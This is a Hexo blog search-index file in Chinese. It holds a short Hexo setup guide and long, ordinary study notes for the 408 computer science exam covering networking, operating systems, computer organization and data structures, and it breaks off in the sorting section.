<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hexo搭建</title>
      <link href="/2024/08/02/hello-world/"/>
      <url>/2024/08/02/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><ol><li><p>Latex格式无法渲染、Latex下标失效</p><blockquote><p>参考：<a href="https://rickliu.com/posts/f9538327001b/index.html">butterfly主题插入数学公式LaTeX | R1ck’s Portal (rickliu.com)</a></p></blockquote></li><li><p>文章内容想要插入图片</p><blockquote><p>参考：<a href="https://blog.csdn.net/nineya_com/article/details/103321401">hexo给文章插入图片、进行图片样式控制_hexo 里面的图片是什么格式-CSDN博客</a></p><p>个人推荐：使用SM.MS图床，对于一些免费图床要千万考虑该站运行时间，本人之前使用的图床中间就挂了，损失惨重（想要方便可以用PicGo自动上传图片至多个图床）</p></blockquote></li><li><p>butterfly主题中页脚颜色与按钮颜色</p><blockquote><p>参考：<a href="https://blog.imzjw.cn/posts/b74f504f/index.html">关于我 Butterfly 主题的所有美化 | 小嘉的部落格 (imzjw.cn)</a></p><p>注意从“首页字体”开始，要新建自己的css</p><p>按钮颜色对应主题的配置文件下”theme_color”，默认是注释的，取消注释后更改”main”值</p></blockquote></li><li><p>独特的头像logo</p><blockquote><p>建议跑AI，绝大部分logo设计需要花钱，或者导出有水印</p><p><a href="https://www.designevo.com/cn/logo-maker/">在线免费制作Logo，定制专属于你的Logo设计 – DesignEvo</a></p></blockquote></li><li><p>音乐播放器</p><blockquote><p>之前主题为Next，参考<a href="https://leezhiy.github.io/2020/04/11/2020-04-11-Hexo-Next搭建个人博客-（添加网页音乐播放器）/">Hexo+Next 搭建个人博客 （添加网页音乐播放器） | Leezhiy Blog</a></p><p>butterfly参见：<a href="https://butterfly.js.org/posts/507c070f/">Butterfly添加全局吸底Aplayer教程 | Butterfly</a></p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>408梳理</title>
      <link href="/2024/07/30/408/"/>
      <url>/2024/07/30/408/</url>
      
        <content type="html"><![CDATA[<h1 id="计网"><a href="#计网" class="headerlink" title="计网"></a>计网</h1><p>梳理408计算机网络体系主要内容</p><ul><li>物理层：通信基础、编码与调制、传输介质</li><li><strong>数据链路层</strong>：三大功能、介质访问控制、局域网&amp;广域网</li><li><strong>网络层</strong>：IPv4体系、路由选择、其他IP技术</li><li><strong>传输层</strong>：TCP、UDP</li><li>应用层：DNS、FTP、邮件、WWW</li></ul><hr><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><blockquote><p>记忆东西较多，注意各种计算公式</p></blockquote><h3 id="通信基础"><a href="#通信基础" class="headerlink" title="通信基础"></a>通信基础</h3><ul><li>信源——变换器——信道——反变换器——信宿。信道中有噪声源干扰</li><li>基带信号，即01两种电压表示，送到数字信道上，叫做基带传输</li><li>模拟信号，对基带信号调制得到，送到模拟信道上，叫频带传输；如果将链路虚拟为多个信道，这是就叫做宽带传输</li><li>码元Baud，是信号的单位，码元宽度是一码元对应的时间长度，1 Baud = n bit</li><li>数据传输方式可以是，串行传输/并行传输；信道两端通信方式可以是，单向通信/半双工通信/全双工通信</li><li>信道的<strong>极限容量</strong>，无高斯噪声应用奈氏准则，否则应用香农定理</li></ul><h3 id="编码调制"><a href="#编码调制" class="headerlink" title="编码调制"></a>编码调制</h3><ul><li>数字数据经过数字发送器得到数字信号<ul><li><strong>编码</strong>方式：归零编码RZ、非归零编码、反向归零编码、曼彻斯特编码、差分曼彻斯特编码</li></ul></li><li>数字数据经过调制器得到模拟信号<ul><li>调制方式：调幅AM、调频FM、调相PM、正交幅度调制QAM</li></ul></li><li>最终得到数字信号的就是编码，得到模拟信号的就是调制</li></ul><h3 id="传输介质"><a href="#传输介质" class="headerlink" title="传输介质"></a>传输介质</h3><blockquote><p>传输介质并非属于物理层，物理层规定了电气特性</p></blockquote><ul><li>非导向介质：在自由空间传输，无线电波、微波、红外线、激光</li><li>导向介质：<ul><li>双绞线：根据是否有金属丝编织的屏蔽层分为，非屏蔽双绞线UTP/屏蔽双绞线STP</li><li>同轴电缆：50Ω的用于传基带信号，75Ω传宽带信号</li><li>光纤：单模光纤发光源为半导体激光器，只有一道光波；多模光纤的发光源是发光二极管，由多条光线从不同角度入射</li></ul></li><li>接口特性：机械特性、电器特性、功能特性、过程特性</li></ul><hr><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><blockquote><p>差错检测码；802.3/11和广域网细节内容</p></blockquote><h3 id="三大功能"><a href="#三大功能" class="headerlink" title="三大功能"></a>三大功能</h3><ul><li><p>组帧与透明传输</p><ul><li><p>注意帧定界、帧同步、透明传输等概念</p></li><li><p>方法：字符计数法、字节填充法、零比特填充法、违规编码法</p></li></ul></li><li><p><strong>差错检测</strong></p><ul><li>ARQ自动重传请求——检错编码：奇偶校验码、CRC循环冗余码（有纠错功能，但这里没使用）</li><li>FEC前向纠错——纠错编码：海明码</li></ul></li><li><p>流量控制</p><ul><li>接受方控制发送方速率，主要就是<strong>滑动窗口</strong>协议，再加上超时重传与确认机制即可靠传输协议</li><li>根据发送窗口和接收窗口的大小，分为停止等待协议SW、后退N帧协议GBN、选择重传协议SR</li></ul></li></ul><h3 id="介质访问控制"><a href="#介质访问控制" class="headerlink" title="介质访问控制"></a>介质访问控制</h3><blockquote><p>即多个用户如何使用一条线</p></blockquote><ul><li>信道划分介质访问控制<ul><li>包括频分复用FDM、时分复用TDM、波分复用WDM、码分复用CDM（也叫码分多址CDMA）</li></ul></li><li>随机划分介质访问控制<ul><li>ALOHA协议：纯ALOHA、时隙ALOHA</li><li>CSMA协议-载波监听多路访问：1-坚持CSMA、非坚持CSMA、p-坚持CSMA</li><li><strong>CSMA-CD</strong>：载波监听多路访问/冲突检测协议，用于802.3以太网</li><li><strong>CSMA-CA</strong>：载波监听多路访问/冲突避免协议，用于802.11无线局域网</li></ul></li><li>轮询访问：主要是令牌传递协议</li></ul><h3 id="局域网与广域网"><a href="#局域网与广域网" class="headerlink" title="局域网与广域网"></a>局域网与广域网</h3><ul><li><strong>802.3以太网</strong><ul><li>使用无连接不可靠服务；广播方式；CSMA/CD；曼彻斯特编码</li><li>48位MAC地址</li><li>以及MAC帧字段</li><li>传输介质10BASE-T等意思</li><li>高速以太网；差分曼彻斯特编码</li></ul></li><li>802.11无线局域网<ul><li>又叫Wi-Fi；CSMA/CA；</li><li>每个接入点AP覆盖的范围叫做基本服务区BSS，带着其中的设备总体叫做BSA基本服务集</li><li>每个接入点AP都会被分配一个服务集标识符SSID，通过分配系统DS，能够和另一个AP构成扩展服务集ESS，通过此接入有线网络</li><li>802.11帧的有四个地址</li></ul></li><li>802.3ac虚拟以太网<ul><li>在802.3帧中插入了VLAN标签，形成802.1Q帧</li><li>交换机与主机之间使用标准帧；交换机之间使用上述帧，其线路叫干线链路/汇聚链路</li></ul></li><li>广域网<ul><li>点对点通信；不可靠服务；因为是全双工所以不使用CSMA/CD</li><li>PPP协议，下分链路控制协议LCP、网络控制协议NCP；注意过程</li></ul></li></ul><hr><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><blockquote><p>IP划分与计算；路由算法可能会和数据结构结合</p></blockquote><p>提供的两种服务：虚电路VC和数据报，前者通过虚电路号VCID实现线路的提前规划，后者利用转发表走到哪里看哪里</p><p>SDN：软件定义网络相关概念</p><h3 id="IPv4体系"><a href="#IPv4体系" class="headerlink" title="IPv4体系"></a>IPv4体系</h3><ul><li>包格式：IP分组20B首部+可选首部，注意字段中的首部长度：总长度：片偏移单位比=4：1：8</li><li>地址：32位IP地址，点分十进制表示，注意ABCD分类和特殊IP</li><li>NAT：网络地址转换，记住三个私有IP地址段10.x.x.x、172.16.x.x、192.168.x.x；</li><li><strong>子网划分</strong>与子网掩码</li><li>CIDR无分类域间路由选择：了解路由聚合/超网；查找方式—<strong>最长前缀匹配</strong></li><li>ARP地址解析协议：网络层协议；注意过程！</li><li>DHCP动态主机配置协议：应用层协议—UDP；即插即用；注意过程C/S模式</li><li>ICMP网际控制报文协议：网络层协议；报文分类；ping工作于应用层，tracert工作于网络层</li></ul><h3 id="路由选择"><a href="#路由选择" class="headerlink" title="路由选择"></a>路由选择</h3><ul><li>内部网关协议IGP<ul><li><strong>路由信息协议RIP</strong>：应用层协议—UDP:520；分布式距离向量算法；仅和相邻路由交换信息</li><li>开放最短路径优先协议OSPF：网络层协议；分布式链路状态路由算法；迪杰斯特拉算法</li></ul></li><li>外部网关协议EGP<ul><li>边界网关协议BGP：应用层—TCP；路径向量路由选择协议；边界路由器互传AS信息序列</li></ul></li></ul><h3 id="其他IP"><a href="#其他IP" class="headerlink" title="其他IP"></a>其他IP</h3><ul><li>IPv6：128bit，固定40B首部；冒号十六进制记法；v4到v6有双协议栈、隧道技术</li><li>IP多播：IGMP网际组管理协议；注意包是以IP报基础；注意过程</li><li>移动IP：三个角色移动节点、本地代理、外地代理；数据报交流过程！</li></ul><hr><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><blockquote><p>检验和计算；重点还是TCP字段、三握四挥及拥塞控制</p></blockquote><h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><ul><li><p>实现了分用和复用+差错检测；无需建立连接；不可靠；面向报文——报文不可分割</p><blockquote><p>如果网络层采用了虚电路服务（面向连接）则传输层无法使用UDP</p></blockquote></li><li><p>字段=8B：源端口、目的端口、长度、检验和；如果接收方发现目的端口不正确则会丢弃该数据包并返回一个ICMP差错报文</p></li><li><p><strong>检验和计算</strong>：首部前+12B的伪首部，并在末尾添0使其为2B倍数；注意计算</p></li></ul><h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><ul><li>可靠、有序、面向连接、全双工通信、面向字节流</li><li>字段：20-60B但应为4B倍数；<strong>标志位</strong></li><li><strong>三握四挥</strong>：过程、数据包标志位、是否可以带数据、释放时间等</li><li>可靠传输：检验、序号、确认、重传机制</li><li><strong>流量控制与拥塞控制</strong>：前者是两个端点之间的速率控制，后者是减轻网络负担；慢开始、拥塞避免、快重传、快恢复算法</li></ul><hr><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><ul><li><p>域名系统DNS—UDP—53：根/顶级/权限/本地域名服务器；解析过程有递归查询（别人跑腿）和迭代查询（自己跑腿）</p></li><li><p>文件传输协议FTP—TCP—20、21：21用于控制连接，20用于数据连接（有主动和被动模式）；带外传送</p></li><li><p>电子邮件：多用途因特网邮件扩展MIME将用户传送的信息都转为ASCII码传递</p><ul><li>简单邮件传输协议SMTP—TCP—25：用于发邮件</li><li>邮局协议POP3—TCP—110：能够下载并保留/删除邮件</li><li>因特网报文存取协议IAMP：也适用于拉取邮件，但是支持文件夹相关操作，以及仅读取文件部分内容</li></ul></li><li><p>万维网WWW：</p><ul><li><p>统一资源定位符URL；超文本传输协议HTTP—TCP—80；超文本标记语言HTML</p></li><li><p>HTTP1.0非持续连接，1.1持续连接但是有流水线和非流水线方式；注意相关计算</p></li></ul></li></ul><div class="table-container"><table><thead><tr><th>协议</th><th>端口</th></tr></thead><tbody><tr><td>DNS——地址解析协议</td><td>UDP-53</td></tr><tr><td>TFTP——简单文件传输协议</td><td>UDP</td></tr><tr><td>FTP——文件传输协议</td><td>TCP-20、21</td></tr><tr><td>SMTP——简单邮件传输协议</td><td>TCP-25</td></tr><tr><td>POP3——邮局协议</td><td>TCP-110</td></tr><tr><td>HTTP——超文本传输协议</td><td>TCP-80</td></tr><tr><td>HTTPS——超文本传输安全协议</td><td>TCP-443</td></tr><tr><td>TELNET</td><td>TCP-23</td></tr><tr><td>RIP（路由选择）</td><td>UDP-520</td></tr><tr><td>BGP（路由选择）</td><td>TCP</td></tr><tr><td>SNMP——简单网络管理协议</td><td>UDP</td></tr><tr><td>IGMP——网际组管理协议</td><td>UDP</td></tr><tr><td>ICMP——网际控制报文协议</td><td>网络层</td></tr><tr><td>OSPF（路由选择）</td><td>网络层</td></tr><tr><td>ARP——地址解析协议</td><td>网络层</td></tr><tr><td>DHCP——动态主机配置</td><td>UDP</td></tr></tbody></table></div><hr><hr><h1 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h1><blockquote><p>将部分计组内容放在这里容易连起来</p></blockquote><ul><li>总线与IO：总线、I/O设备控制方式、I/O软件层次</li><li>文件系统：文件与目录、文件系统</li><li><strong>存储系统</strong>：存储器分类、cache、主存、外存、内存管理</li><li>进程管理：进程状态及调度、<strong>同步互斥</strong>、死锁</li></ul><hr><h2 id="总线与IO"><a href="#总线与IO" class="headerlink" title="总线与IO"></a>总线与IO</h2><h3 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h3><ul><li><p>总线从内到外：片内总线、系统总线、I/O总线、外部总线</p></li><li><p>总线事务=请求总线 + 申请仲裁 + 寻址 + 传输数据 + 释放总线</p><blockquote><p>传输数据包括突发传输和非突发传输，注意区分计算</p></blockquote></li><li><p><strong>总线定时</strong>：用于双方协商换数据的时间</p><ul><li>方式有：同步、异步、半同步、分离式</li></ul></li></ul><h3 id="IO设备控制方式"><a href="#IO设备控制方式" class="headerlink" title="IO设备控制方式"></a>IO设备控制方式</h3><blockquote><p>I/O基础知识主要就是：I/O接口（设备控制器）组成、设备分类、编址方式</p></blockquote><ul><li>主机访问I/O设备的控制方式有：程序查询、中断、DMA、通道</li><li>程序查询：CPU与设备串行工作，程序一直在循环查询是否繁忙</li><li><strong>中断</strong>：中断分类、中断优先级、相关寄存器、响应中断过程、隐指令与中断程序、中断向量表</li><li>DMA：直接存储器存取方式，外设数据不过CPU<ul><li>传送过程（数据块为单位，DMA仅在头尾中断告知CPU）、传送方式——访存冲突（停止CPU、挪用一点、各一半）</li></ul></li></ul><h3 id="I-O软件层次"><a href="#I-O软件层次" class="headerlink" title="I/O软件层次"></a>I/O软件层次</h3><ul><li>从上到下：用户层、设备独立性、设备驱动、中断处理、硬件</li><li><strong>设备独立性</strong>：所有设备的公有操作，包括后面的设备分配回收和SPOOLing<ul><li>注意区分磁盘高速缓冲和缓冲区，前者是内存暂存磁盘信息，后者是输入/出流存放的位置</li><li>缓冲区包括：单缓冲、双缓冲、循环缓冲、多缓冲；有计算</li></ul></li><li>设备分配与回收：注意几个概念；逻辑设备表LUT、物理设备表SDT、设备控制表DCT、控制器控制表COCT、通道控制表CHCT</li><li>SPOOLing：假脱机技术；独占设备改共享设备；输入输出井，还是将任务存储起来一个个来</li></ul><hr><h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><h3 id="文件与目录"><a href="#文件与目录" class="headerlink" title="文件与目录"></a>文件与目录</h3><ul><li><p>概念：文件控制块FCB、目录项、访问控制列表ACL、软/硬链接</p></li><li><p><strong>文件打开过程</strong>，注意索引节点复制到内存后又添加了东西</p><blockquote><p>打开文件仅仅是目录项被复制到打开文件表中，文件具体内容并不在内存</p></blockquote></li><li><p>文件包括逻辑结构和<strong>物理结构</strong>（连续分配、显/隐式链接、单/多/混合索引）</p></li><li><p>目录结构：单级目录、两级目录、树形目录、无环图目录结构</p></li></ul><h3 id="文件系统-1"><a href="#文件系统-1" class="headerlink" title="文件系统"></a>文件系统</h3><ul><li>空闲区块管理：空闲表、空闲链表、位示图、成组链接法</li><li>VFS四大对象：超级块、索引节点、目录项、文件对象</li><li>OS启动过程及文件系统相关部分在磁盘上的位置</li></ul><hr><h2 id="存储系统"><a href="#存储系统" class="headerlink" title="存储系统"></a>存储系统</h2><h3 id="存储器分类"><a href="#存储器分类" class="headerlink" title="存储器分类"></a>存储器分类</h3><ul><li>按存储介质分：磁表面、磁芯、半导体存储器、光存储器</li><li>按存取方式分：<ul><li>随机存储器RAM：静态SRAM（cache）；动态DRAM（主存）；动态就是因为破坏性读出，需要定时刷新读后再生</li><li>只读存储器ROM：掩膜式ROM；一次可编程ROM；可擦可编程ROM；Flash</li><li>串行访问存储器：顺序存储的磁带；直接存取的磁盘、光盘</li></ul></li><li>DRAM：刷新方式有集中、分散、异步刷新</li></ul><h3 id="Cache"><a href="#Cache" class="headerlink" title="Cache"></a>Cache</h3><ul><li><strong>映射</strong>方式：直接映射、全相联映射、组相联映射</li><li>Cache<strong>替换</strong>算法：随机替换、FIFO、LRU近期最少使用、LFU最不经常使用</li><li>Cache<strong>容量</strong>计算：注意分清存储容量和标记阵列（标记位还要依据替换算法）</li><li>Cache<strong>一致性</strong>：一般是回写+写分配，L1 cache对L2是全写+非写分配<ul><li>写命中：直写法、回写法</li><li>未命中：写分配、非写分配</li></ul></li></ul><h3 id="主存"><a href="#主存" class="headerlink" title="主存"></a>主存</h3><ul><li>构成：控制信号、地址寄存器、地址译码器（单译码、双译码）</li><li>注意MAR、MDR相关过程</li><li>多模块存储：<ul><li>类型：单体多字存储器、多体并行存储器（高位交叉、低位交叉——真正的交叉存储器）</li><li>启动方式：轮流启动、同时启动</li></ul></li><li>容量扩展：位扩展、字扩展、同时扩展</li><li>片选信号：线选、译码片选</li></ul><h3 id="外存"><a href="#外存" class="headerlink" title="外存"></a>外存</h3><ul><li>磁盘的H.C.S=磁头、柱面、扇区，注意磁盘地址计算</li><li>磁盘管理：低级/高级格式化</li><li><strong>磁盘调度算法</strong>：FCFS、SSTF最短寻道、SCAN电梯算法、C-SCAN循环扫描</li><li>固态硬盘：组成、磨损均衡</li></ul><h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><ul><li>内存保护：上下限寄存器、基址+限长寄存器</li><li>内存分配方式：<ul><li>连续分配管理：单一连续分配、固定分区分配、动态分区分配（顺序分配、索引分配）<ul><li>顺序分配：首次适应、邻近适应、最佳适应、最坏适应</li><li>索引分配：快速适应、伙伴系统、哈希</li></ul></li><li><strong>离散分配管理</strong>：基本页式/段式/段页式；注意相应寄存器和地址分割</li></ul></li><li>虚拟内存：基本分页+请求调页+页面置换<ul><li><strong>页面置换</strong>：最佳置换OPT、FIFO、LRU最近最久未使用、CLOCK时钟置换、改进型CLOCK</li><li>其他小问题：何处调页、调页时机、固定分配、驻留集分配大小</li></ul></li></ul><hr><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="进程状态及调度"><a href="#进程状态及调度" class="headerlink" title="进程状态及调度"></a>进程状态及调度</h3><ul><li><p>进程实体 = PCB + 程序段 + 数据段</p></li><li><p>进程的<strong>五个状态和相互转换</strong>，分清楚那个阶段是高级/中级/低级调度</p><blockquote><p>创建态、就绪态、运行态、阻塞态、终止态</p></blockquote></li><li><p><strong>调度算法</strong>：FCFS、SJF短作业优先、高响应比优先、优先级调度算法、时间片轮转RR、多级队列、多级反馈队列</p><blockquote><p>SJF和高响应比算法主要用于作业调度，即从外存调入到内存</p></blockquote></li><li><p>进程间通信（高级通信）：共享存储、消息传递、管道通信、socket</p><blockquote><p>这里的高级通信指的是高效率</p></blockquote></li><li><p>线程：基本的CPU执行单元</p><ul><li>实现方式：用户级线程ULT、内核级线程KLT</li><li>多线程模型：一对一、多对一、多对多</li></ul></li></ul><h3 id="同步互斥"><a href="#同步互斥" class="headerlink" title="同步互斥"></a>同步互斥</h3><ul><li>理清楚同步和互斥区别；同步机制的四大准则（空闲让进、忙则等待、有限等待、让权等待）</li><li>基本方法：软件（peterson算法）、硬件（中断屏蔽、TestAndSet指令、Swap指令）</li><li>其他方法：<strong>互斥锁、信号量</strong>、管程</li></ul><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><ul><li>产生原因：系统资源竞争、进程推进顺序非法</li><li>必要条件：互斥、不可剥夺、请求并保持、循环等待</li><li>处理：死锁预防（破四条件）、<strong>死锁避免</strong>（银行家算法+安全性算法）、死锁检测和解除<ul><li>银行家算法：注意没有安全序列并非说当前就是不安全状态</li><li>死锁接触：资源剥夺、撤销进程、进程回退</li></ul></li></ul><hr><hr><h1 id="计组"><a href="#计组" class="headerlink" title="计组"></a>计组</h1><blockquote><p>因为大部分都放在了OS，这里就很容易梳理</p></blockquote><ul><li>指令系统与数据表示：指令码格式、汇编指令、<strong>整数表示</strong>、浮点数表示</li><li>中央处理器：CPU组成、数据通路、控制器、<strong>指令执行过程</strong></li></ul><hr><h2 id="指令系统与数据表示"><a href="#指令系统与数据表示" class="headerlink" title="指令系统与数据表示"></a>指令系统与数据表示</h2><h3 id="指令码格式"><a href="#指令码格式" class="headerlink" title="指令码格式"></a>指令码格式</h3><ul><li>ISA基本概念、注意扩展操作码的种类计算</li><li><strong>数据寻址</strong>（10种）：隐含寻址、立即数寻址、直接寻址、间接寻址、寄存器寻址、寄存器间接寻址、相对寻址、基址寻址、变址寻址、堆栈寻址</li></ul><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><ul><li>直接上x86汇编，注意栈帧相关内容</li><li>大小端对齐和结构体边界对齐计算</li></ul><h3 id="整数表示"><a href="#整数表示" class="headerlink" title="整数表示"></a>整数表示</h3><ul><li>十进制与其他进制转换，整数除基取余、小数乘基取整</li><li>原码、反码、补码、移码的计算；特别是<strong>补码的加减法</strong></li><li>运算器组成；运算后各个<strong>标志位</strong>及意义</li><li>整数原码乘除法</li></ul><h3 id="浮点数表示"><a href="#浮点数表示" class="headerlink" title="浮点数表示"></a>浮点数表示</h3><ul><li>IEEE 754 标准：32位float=1：8：23；64位double=1：11：52；搞清楚<strong>特殊表示</strong></li><li>浮点数规格化与浮点数<strong>加减</strong></li></ul><hr><h2 id="中央处理器"><a href="#中央处理器" class="headerlink" title="中央处理器"></a>中央处理器</h2><h3 id="CPU组成"><a href="#CPU组成" class="headerlink" title="CPU组成"></a>CPU组成</h3><ul><li>组成：运算器 + 控制器 （向下细分）or 控制部件 + 数据通路</li><li>多处理器体系：单指令单数据流SISD、单指令多数据流SIMD、多指令多数据流MIMD</li><li>硬件多线程、多核处理器、共享内存多处理器SMP</li></ul><h3 id="数据通路"><a href="#数据通路" class="headerlink" title="数据通路"></a>数据通路</h3><ul><li>组成：组合逻辑元件、时序逻辑元件</li><li>结构：CPU内部单总线、CPU内部多总线、专用数据通路</li></ul><h3 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h3><ul><li>如何产生微操作信号：硬布线控制器、<strong>微程序控制器</strong></li><li>微程序相关概念：微命令、微指令、微程序、微操作、微地址；微程序控制器工作过程</li><li>微指令的编码、地址形成、格式</li></ul><h3 id="指令执行"><a href="#指令执行" class="headerlink" title="指令执行"></a>指令执行</h3><ul><li>流水线指令执行五个阶段：取指IF、译码ID、执行EX、访存MEM、写回WB</li><li>指令流水线及并行技术（流水线、超标量处理机）；高级流水线（多发射技术、超流水线技术）</li><li><strong>流水线冒险</strong>：结构冒险、数据冒险、控制冒险</li></ul><hr><hr><h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><ul><li>线性表：栈、队列、矩阵、<strong>串</strong></li><li>树：树与森林、<strong>二叉树</strong>、树的应用</li><li>图：图存储与遍历、<strong>图的应用</strong></li><li>查找：线性查找、<strong>树查找</strong>、B树、散列表</li><li>排序：10个<strong>内部排序</strong>、外部排序</li></ul><h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><blockquote><p>该章节需明确数据结构三要素=逻辑结构+物理结构+运算；来区分线性表这个逻辑结构和栈队列等运算</p><p>个人重点在线性表算法、KMP</p></blockquote><p>线性表：分为顺序表和链表，链表包含单链表、双链表、循环链表、静态链表；very easy</p><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><ul><li>主要就是物理存储结构</li><li>注意卡特兰数；链栈一般无头结点</li><li>栈的括号匹配、<strong>前后缀表达式</strong>转换</li></ul><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><ul><li>逻辑上有顺序队、循环队、链队、双端队列</li><li>主要理清循环队列中的<strong>头尾指针指向</strong></li></ul><h3 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h3><ul><li>特殊矩阵压缩，可以自己<strong>推公式</strong></li></ul><h3 id="串"><a href="#串" class="headerlink" title="串"></a>串</h3><ul><li>唯一重点<strong>KMP算法</strong>，和其优化后的nextval数组的计算；背公式！</li></ul><hr><h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><h3 id="树与森林"><a href="#树与森林" class="headerlink" title="树与森林"></a>树与森林</h3><ul><li><p>性质：树的结点数n等于所有结点的度数之和+1…</p></li><li><p>存储结构：双亲表示法、孩子表示法、孩子兄弟表示法</p><blockquote><p>注意树和森林转换</p></blockquote></li></ul><h3 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h3><ul><li>性质：非空二叉树上，叶结点数 = 度为2的结点数 + 1…</li><li>存储结构：顺序存储、链式存储（二叉链、三叉链）</li><li>遍历算法：先中后序遍历、层次遍历；中序遍历序列+其他任何一种都可得到唯一确定二叉树</li><li>线索二叉：基于上面的遍历算法实现，多加一个判断；无左子树则左指针指向前驱</li></ul><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><ul><li>哈夫曼树：了解带权路径长度WPL；以及可变长的哈夫曼编码</li><li>并查集：数组做成的静态链表；子集按秩合并；查找元素压缩路径</li></ul><hr><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="存储与遍历"><a href="#存储与遍历" class="headerlink" title="存储与遍历"></a>存储与遍历</h3><ul><li>存储方式：邻接矩阵、邻接表、十字链表（仅有向图）、邻接多重表（仅无向图）</li><li>图的遍历：</li></ul><div class="table-container"><table><thead><tr><th>算法</th><th>邻接矩阵</th><th>邻接表</th><th>空间复杂度</th></tr></thead><tbody><tr><td>BFS</td><td>O(V^2^)</td><td>O(V + E)</td><td>O(V)</td></tr><tr><td>DFS</td><td>O(V^2^)</td><td>O(V + E)</td><td>O(V)</td></tr></tbody></table></div><h3 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h3><ul><li>最小生成树MST（带权连通无向图）：Prim算法、Kruskal算法</li><li>最短路径（带权有向图）：单源Dijkstra算法、多源Flody（也可带权无向）、单源无权DFS</li><li>有向无环图DAG：AOV拓扑排序、AOE关键路径</li></ul><hr><h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><h3 id="线性查找"><a href="#线性查找" class="headerlink" title="线性查找"></a>线性查找</h3><ul><li>无序线性表顺序查找、有序线性表顺序查找、有序线性表二分查找、分块查找</li></ul><h3 id="树形查找"><a href="#树形查找" class="headerlink" title="树形查找"></a>树形查找</h3><ul><li>二叉排序树BST——优化——平衡二叉树AVL——优化——红黑树</li><li>AVL插入结点时要保持平衡的操作：RR、RL</li><li>红黑树：定义、性质、<strong>插入平衡调整</strong></li></ul><h3 id="B树"><a href="#B树" class="headerlink" title="B树"></a>B树</h3><ul><li><p>m路平衡查找树，注意各个节点关键字数量；B+树同理</p><blockquote><p>B树是节点存放信息，B+树是仅叶子存放信息指向</p></blockquote></li><li><p>B树的查找、插入、删除操作（节点分裂）</p></li></ul><h3 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h3><ul><li>构造方式：直接定址、除留余数、数字分析法、平方后取中间几位</li><li>冲突处理方式：线性探测、平方探测、双散列、伪随机数序列、拉链法</li></ul><blockquote><p>主要就是在于平均查找长度ASL的的计算</p></blockquote><hr><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><h3 id="内部排序"><a href="#内部排序" class="headerlink" title="内部排序"></a>内部排序</h3><div 